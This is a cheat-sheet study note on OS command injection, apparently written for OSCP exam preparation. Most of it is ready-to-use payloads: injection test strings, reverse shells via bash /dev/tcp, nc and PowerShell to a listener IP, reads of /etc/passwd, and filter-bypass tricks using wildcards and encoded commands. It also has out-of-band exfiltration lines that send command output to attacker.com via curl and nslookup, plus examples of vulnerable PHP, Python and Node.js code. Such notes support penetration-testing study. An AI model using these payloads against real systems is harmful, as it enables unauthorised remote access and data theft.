---
tags: [oscp, web, command-injection, rce]
aliases: [OS Command Injection]
category: Web
difficulty: ★★☆☆☆
last-updated: 2025-04-30
---

# ⚙️ Command Injection (OS Command Execution)

> [!info] Direct RCE
> Inject OS commands directly into application logic.

---

## 🎯 Detection

### Test Strings

```bash
; id ;
| whoami |
& whoami &
` id `
$( id )
|| id ||
&& whoami &&
```

### Example

```
Normal: http://target/ping?ip=8.8.8.8
Injected: http://target/ping?ip=8.8.8.8; whoami

If output shows "root", command injection confirmed!
```

---

## 💣 Exploitation Payloads

### Basic Commands

```bash
; whoami ;
; id ;
; cat /etc/passwd ;
; ls -la /home ;
```

### Chaining Commands

```bash
; command1 ; command2 ;
| command1 | command2 |
& command1 & command2 &
&& command1 && command2 &&
```

### Reverse Shell via Command Injection

```bash
; bash -i >& /dev/tcp/10.10.10.10/4444 0>&1 ;

| nc 10.10.10.10 4444 -e /bin/bash |

& powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);..." &
```

---

## 🛡️ Bypass Filters

### Blacklist Bypass

```bash
# If ";" blacklisted, use pipe
ip=8.8.8.8 | whoami

# If "cat" blacklisted
tac /etc/passwd         # tac = reverse cat
less /etc/passwd
head /etc/passwd

# Using wildcards
c?t /etc/passwd
c*t /etc/passwd

# Using environment variables
echo $IFS              # IFS = Internal Field Separator
whoami${IFS}>/tmp/output

# Variable concatenation
$(w)$(h)$(o)$(a)$(m)$(i)
```

### Encoding Bypass

```bash
# Hex encoding
echo -e "\x62\x61\x73\x68" | bash   # Decodes to "bash"

# Base64
echo YmFzaAo= | base64 -d            # Decodes to "bash"

# Octal
bash <<< "$(printf '%b' '\102\141\163\150')"
```

---

## 🔐 Blind Command Injection

**What:** Command executes but no output visible

### Time-Based Detection

```bash
; sleep 10 ;
; ping -c 5 127.0.0.1 ;

# If response delays, blind injection confirmed
```

### Out-of-Band Exfiltration

```bash
# DNS exfiltration
; nslookup $(whoami).attacker.com ;

# HTTP callback
; curl http://attacker.com/$(whoami) ;

# Monitor on attacker:
# tcpdump -i eth0 'udp port 53'
# python3 -m http.server
```

---

## 📊 Application Context

### PHP

```php
<?php
$output = shell_exec($_GET['cmd']);  // Vulnerable!
echo $output;
?>
```

Injection:
```
?cmd=whoami; cat /etc/passwd
```

### Python

```python
os.system(user_input)      # Vulnerable
subprocess.call(user_input) # Vulnerable
```

### Node.js

```javascript
exec(userInput, ...)       // Vulnerable
child_process.spawn(...)   // Vulnerable
```

---

## 📋 Exploitation Checklist

- [ ] Identify command injection point
- [ ] Test basic command (id, whoami)
- [ ] Verify execution (time delay or blind)
- [ ] Extract data (cat files, list users)
- [ ] Escalate to reverse shell
- [ ] Post-exploitation enumeration

---

## 💡 Pro Tips

> [!tip] Pipe is Often Allowed
> When ";" is filtered, try "|" (pipe) instead.

> [!tip] Time-Based Confirmation
> If blind, use "sleep" to confirm execution.

> [!tip] Out-of-Band is Reliable
> HTTP/DNS callbacks work even when output is hidden.

---

**Related Notes:**
- [[04-Web/Web-Vulnerabilities|🌐 Web Vulnerabilities]]
- [[02-Linux/Shells-and-Payloads|💀 Shells & Payloads]]

---
